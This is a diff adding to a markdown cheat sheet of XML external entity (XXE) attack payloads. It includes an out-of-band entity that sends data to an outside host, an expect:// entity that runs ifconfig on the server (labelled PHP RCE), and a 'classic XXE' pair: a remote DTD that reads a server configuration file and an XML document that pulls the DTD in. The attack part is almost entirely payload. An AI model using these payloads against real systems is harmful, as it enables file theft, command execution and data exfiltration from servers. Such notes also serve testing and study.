@@ -522,3 +522,39 @@ OUT OF BAND XXE
 		<!ENTITY % bravo "<!ENTITY &#X25; delta SYSTEM 'http://test.com/xxe?%charlie;'>">
 ```
 
+![image](https://github.com/user-attachments/assets/fac143af-70e2-465f-ad51-9b7ca5abdbb0)
+
+
+SSRF
+
+![image](https://github.com/user-attachments/assets/4d87f9d3-0ce3-4710-9116-99523e49c72c)
+
+
+PHP RCE
+
+(<!ENTITY rce SYSTEM “expect://ifconfig” >).
+
+
+# later
+
+
+### classic XXE
+
+formatting.dtd:
+```python
+
+	<!DOCTYPE STRUCTURE [
+<!ELEMENT SPECIFICATIONS (#PCDATA)>
+<!ENTITY VERSION “1.1”>
+<!ENTITY file SYSTEM “file:///c:/server_files/application.conf” >
+]>
+
+```
+
+```python
+
+	<?xml version=”1.0″ encoding=”UTF-8″?>
+<!DOCTYPE foo SYSTEM “http://validserver.com/formatting.dtd”>
+<specifications>&file;</specifications>
+
+```
